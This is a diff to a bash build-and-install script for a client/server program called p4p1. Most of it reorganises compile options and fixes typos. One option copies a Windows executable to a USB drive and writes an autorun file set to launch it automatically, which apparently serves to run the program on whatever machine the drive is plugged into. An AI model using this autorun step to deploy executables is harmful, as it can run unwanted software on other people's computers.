@@ -12,6 +12,15 @@
 # User guide to use p4p1-o
 # ./p4p1-o_UserGuide
 
+function Remove {
+	REMOVED_ALL=0
+
+	zip -r p4p1-o_backup.zip ~/.p4p1-o/
+
+	rm -rf ~/.p4p1-o/
+	exit $REMOVED_ALL
+}
+
 E_NOINSTALL=40
 E_EXEMISS=41
 E_NOCHOICE=42
@@ -44,7 +53,40 @@ echo "* | .__/ |_|| .__/_|"
 echo "* |_|       |_|"
 echo "*********welcome*********"
 
-if [ ! -d "$HOME_PATH" ]; then
+if [ "$1" = "-c" ]; then
+
+	if [ ! -e "Makefile" ]; then
+		echo "[!] Error no makefile found!"
+		exit $E_MAKE
+	fi
+
+	echo "[*] Please enter  p4p1 version"
+	read VERSION
+	echo "[*] Making p4p1 version $VERSION for windows"
+	make windows
+
+	if [ "$?" = "2" ]; then
+		echo "[!] Please download mingw"
+		echo "[*] The program will compile the linux client and server version $VERSION"
+		echo "[*] Press enter to continue"
+		read
+		make linux
+
+		mv -v $MAKENAMELC p4p1-o_V$VERSION
+		mv -v $MAKENAMELS p4p1-s_V$VERSION
+	else
+		mv -v $MAKENAMEW32C p4p1-o_32_V$VERSION.exe
+		mv -v $MAKENAMEW64C p4p1-o_64_V$VERSION.exe
+		echo "[*] Making p4p1 version $VERSION for linux"
+		make linux
+
+		mv -v $MAKENAMELC p4p1-o_V$VERSION
+		mv -v $MAKENAMELS p4p1-s_V$VERSION
+	fi
+
+	echo "[*] Compiled all of the p4p1-o and p4p1-s files."
+
+elif [ ! -d "$HOME_PATH" ]; then
 
 	echo "[*] Enter Current Version."
 	read VERSION
@@ -52,7 +94,7 @@ if [ ! -d "$HOME_PATH" ]; then
 	if [ ! -e "p4p1-s_V$VERSION" ]; then
 		echo "[!] Please compile first"
 		echo "[!] ./p4p1-o_UserGuide -c"
-		exit E_NOCOMP
+		exit $E_NOCOMP
 	fi
 
 	echo "[*] First execution do you want to install?? (yes/no)"
@@ -72,14 +114,19 @@ if [ ! -d "$HOME_PATH" ]; then
 	echo name > $UN_FILE
 
 	if [[ ! -e "$W32EXE" && ! -e "$W64EXE" ]]; then
-		echo "[!] missing executables"
-		rm -rf ~/.p4p1-o/
-		exit $E_EXEMISS
-	fi
 
-	echo "[*] Copy exe into $EXE_PATH"
-	mv -v $W32EXE $EXE_PATH
-	mv -v $W64EXE $EXE_PATH
+		echo "[!] missing executables"
+		echo "[!] To reinstall exes so that this file work please use the debug mode."
+		echo "[!] See Usage with -h to use debug mode."
+		echo -e "\e[31m[!] Error code: $E_EXEMISS\e[0m"
+
+	else
+
+		echo "[*] Copy exe into $EXE_PATH"
+		mv -v $W32EXE $EXE_PATH
+		mv -v $W64EXE $EXE_PATH
+
+	fi
 
 	echo "[*] Enter port for p4p1 (We recomend to use the default one 4441)"
 	read port
@@ -101,40 +148,7 @@ if [ ! -d "$HOME_PATH" ]; then
 
 else
 
-	if [ "$1" = "-c" ]; then
-
-		if [ ! -e "Makefile" ]; then
-			echo "[!] Error no makefile found!"
-			exit $E_MAKE
-		fi
-
-		echo "[*] Please enter  p4p1 version"
-		read VERSION
-		echo "[*] Making p4p1 version $VERSION for windows"
-		make windows
-
-		if [ "$?" = "2" ]; then
-			echo "[!] Please download mingw"
-			echo "[*] The program will compile the linux client and server version $VERSION"
-			echo "[*] Press enter to continue"
-			read
-			make linux
-
-			mv -v $MAKENAMELC p4p1-o_V$VERSION
-			mv -v $MAKENAMELS p4p1-s_V$VERSION
-		else
-			mv -v $MAKENAMEW32C p4p1-o_32_V$VERSION.exe
-			mv -v $MAKENAMEW64C p4p1-o_64_V$VERSION.exe
-			echo "[*] Making p4p1 version $VERSION for linux"
-			make linux
-
-			mv -v $MAKENAMELC p4p1-o_V$VERSION
-			mv -v $MAKENAMELS p4p1-s_V$VERSION
-		fi
-
-		echo "[*] Compiled all of the p4p1-o and p4p1-s files."
-
-	elif [ "$1" = "mrproper" ]; then
+	if [ "$1" = "mrproper" ]; then
 
 		echo "[*] Cleaning all of the p4p1 versions"
 		mv -v p4p1-o_V* version/
@@ -155,11 +169,11 @@ else
 
 			echo "[*] Please enter the usb path"
 			read USB_PATH
-			echo "[autorun]" > $AUTORUN
 			echo "[*] is it a 32 bit or 64 bit?"
 			read q
 
 			cd $USB_PATH
+			echo "[autorun]" > $AUTORUN
 
 			if [ "$q" = "32" ];then
 				cp -v $W32EXE_PATH .
@@ -171,7 +185,6 @@ else
 
 			echo "action=Start ShellRun-CD" >> $AUTORUN
 			echo "[*] Created autorun"
-			cp -v $AUTORUN .
 			echo "[*] Copied to file with exe and done!"
 
 		elif [ "$q" = "2" ]; then
@@ -179,7 +192,7 @@ else
 			echo "[*] Retreiving files ..."
 			cd $EXE_PATH
 			cp -v $W32EXE $DESKTOP_PATH
-			cp -v $W64EXEx $DESKTOP_PATH
+			cp -v $W64EXE $DESKTOP_PATH
 
 		elif [ "$q" = "3" ]; then
 
